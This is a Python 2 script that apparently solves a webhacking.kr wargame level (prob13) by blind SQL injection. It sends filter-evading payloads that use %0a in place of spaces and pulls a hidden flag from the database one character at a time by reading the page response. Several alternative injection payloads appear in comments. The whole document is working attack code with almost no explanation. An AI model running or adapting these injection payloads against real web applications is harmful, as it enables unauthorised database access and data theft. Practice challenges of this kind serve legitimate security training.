import requests

url = 'http://webhacking.kr/challenge/web/web-10/index.php'

r = requests.session()
headers = {"Cookie": "PHPSESSID="}
pw = ''


def injection(pos, code):
    payload = 'no=(select%0aord(substr(min(flag),' + str(pos) + \
        ',1))from%0aprob13password)in(' + str(code) + ')'
    # print payload

# payload = '(select%0asubstr(min(flag),1,1)from%0aprob13password)in(0x63)'
#           'if(substr((select%0amin(flag)from%0aprob13password),1,1)in(0x63),1,0)'
#           'if((select%0aord(substr(min(flag),1,1))from%0aprob13password)in(99),1,2)'
#           'if(strcmp(substr((select(min(flag))from%0aprob13password),1,1),0x63),2,1)'
#           '(select%0asubstr(min(binary(flag))%2C1%2C1)%0afrom%0aprob13password)%0ain(0x63)'
#           'if(substr((select%0asubstr(min(flag),1,1)%0afrom%0aprob13password),1,1)in(0x63),1,0)'

    try:
        result = r.get(url, params=payload, headers=headers)
        # print result.content
        return "<td>1</td>" in result.content
    except Exception as e:
        print e
        return e

if __name__ == "__main__":
    length = 0
    while True:
        length += 1
        # print length
        for code in range(33, 128):
            if injection(length, code):
                pw = pw + chr(code)
                print pw
                break
        if (code == 127):
            break

# challenge13luckclear
